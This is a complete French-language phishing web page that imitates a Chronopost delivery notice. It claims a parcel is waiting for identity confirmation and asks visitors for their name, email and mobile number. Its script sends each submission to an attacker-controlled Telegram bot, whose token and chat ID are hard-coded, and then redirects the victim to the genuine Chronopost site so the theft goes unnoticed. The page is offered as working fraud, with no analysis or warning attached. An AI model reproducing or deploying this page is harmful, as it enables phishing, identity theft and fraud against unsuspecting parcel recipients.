<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification Chronopost</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f2f2f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 25px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 380px;
            text-align: center;
        }
        h2 { margin-top: 0; color: #1c1c1e; font-size: 1.4em; }
        p { color: #6e6e73; font-size: 0.95em; line-height: 1.4; }
        input {
            width: 100%; padding: 15px; margin: 10px 0;
            border: 1px solid #c7c7cc; border-radius: 10px;
            box-sizing: border-box; font-size: 16px;
            background: #f9f9f9;
        }
        input:focus { outline: none; border-color: #007aff; background: white; }
        button {
            width: 100%; padding: 16px; background-color: #007aff;
            color: white; border: none; border-radius: 10px;
            font-size: 17px; font-weight: 600; cursor: pointer;
            margin-top: 15px;
            transition: opacity 0.2s;
        }
        button:active { opacity: 0.8; }
        .loader {
            display: none; border: 3px solid #f3f3f3;
            border-top: 3px solid #007aff; border-radius: 50%;
            width: 24px; height: 24px; animation: spin 1s linear infinite;
            margin: 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { margin-top: 15px; font-size: 14px; font-weight: 500; }
        .success { color: #34c759; }
        .error { color: #ff3b30; font-size: 12px; text-align: left; padding: 10px; background: #ffe5e5; border-radius: 8px; display: none;}
    </style>
</head>
<body>

    <div class="card">
        <h2>📦 Chronopost - Livraison</h2>
        <p>Votre colis <strong>#FR-2026-892</strong> est en attente de validation. Veuillez confirmer votre identité pour éviter la réexpédition.</p>
        
        <form id="dataForm">
            <input type="text" id="nom" placeholder="Nom et Prénom" required autocomplete="name">
            <input type="email" id="email" placeholder="Adresse Email" required autocomplete="email">
            <input type="tel" id="tel" placeholder="Numéro de portable" required autocomplete="tel">
            <button type="submit" id="btn">Confirmer l'identité</button>
            <div class="loader" id="loader"></div>
            <p id="status" class="success" style="display:none;">✅ Données envoyées. Redirection...</p>
            <div id="debug" class="error"></div>
        </form>
    </div>

    <script>
        // ==========================================
        // CONFIGURATION DÉJÀ REMPLIE
        // ==========================================
        const TOKEN = "8835375365:AAGXLVfFbU_wNtDvs5jxpEeQ19V2n61Y_WwQ"; 
        const CHAT_ID = "8501464548"; 
        // ==========================================

        document.getElementById('dataForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const nom = document.getElementById('nom').value;
            const email = document.getElementById('email').value;
            const tel = document.getElementById('tel').value;
            const btn = document.getElementById('btn');
            const loader = document.getElementById('loader');
            const status = document.getElementById('status');
            const debug = document.getElementById('debug');

            btn.style.display = 'none';
            loader.style.display = 'block';
            debug.style.display = 'none';

            const message = 
`🔔 <b>Nouvelle Identification</b>

👤 <b>Nom:</b> ${nom}
📧 <b>Email:</b> ${email}
📱 <b>Tel:</b> ${tel}

📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}
🌍 <b>Appareil:</b> ${/iPhone|iPad/i.test(navigator.userAgent) ? "iOS" : "Autre"}`;

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(res => {
                if(!res.ok) throw new Error(`Erreur API: ${res.status}`);
                return res.json();
            })
            .then(data => {
                if(data.ok) {
                    status.style.display = 'block';
                    setTimeout(() => {
                        window.location.href = "https://www.chronopost.fr";
                    }, 1500);
                } else {
                    throw new Error(data.description || "Erreur inconnue");
                }
            })
            .catch(err => {
                debug.textContent = "DÉTAIL: " + err.message;
                debug.style.display = 'block';
                loader.style.display = 'none';
                btn.style.display = 'block';
            });
        });
    </script>

</body>
</html>
